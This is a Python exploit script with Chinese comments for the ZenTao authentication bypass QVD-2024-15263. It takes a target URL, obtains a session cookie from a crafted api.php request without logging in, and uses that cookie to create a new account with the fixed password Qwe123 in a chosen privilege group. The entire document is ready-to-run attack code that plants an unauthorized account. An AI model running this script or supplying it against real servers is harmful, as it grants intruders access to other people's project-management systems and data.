###禅道身份认证绕过漏洞（QVD-2024-15263 ）
###writer： summerainX
###脚本使用方式
###初次使用可以 python QVD-2024-15263.py -t url 

import requests,re
import argparse

def get_cookie(url):
    try:
        res = requests.get(url+"/zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=dddidkyodsnfamzvjidb&branch=klmnehgxnsmeuhshbooy")
        cookie = re.search(r'zentaosid=([a-f0-9]+);',res.headers.get("Set-Cookie")).group(1)
        return cookie
    except:
        return None

def create_user(url,cookie,user='test',group='1'):
    data = {
        "account":user,
        "password":"Qwe123",
        "realname":"test",
        "role":"",
        "group":group
        }
    headers = {
        "Cookie": "zentaosid={};".format(cookie)
    }
    try:
        res = requests.post(url+"/zentao/api.php/v1/users",data=data,headers=headers)
        if res.status_code == 201:
            print("账号创建成功！ 账号：{} 密码：Qwe123".format(user))
        elif res.status_code == 200:
            print("漏洞不存在！")
        elif res.status_code == 400:
            print("账号已存在，请更换账号名称！")
        else:
            print("漏洞不存在！")
    except:
        print("漏洞不存在！")


def main(url, user, group):
    cookie = get_cookie(url)
    create_user(url,cookie,user,group)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='需要输入一些参数')
    parser.add_argument('-t', '--target', type=str, required=True, help='目标网站')
    parser.add_argument('-u','--user', type=str, required=False, help='登录名，默认为test')
    parser.add_argument('-g','--group', type=str, required=False, help='用户分组，默认为1，数值不同权限不同')

    args = parser.parse_args()
    main(args.target, args.user, args.group)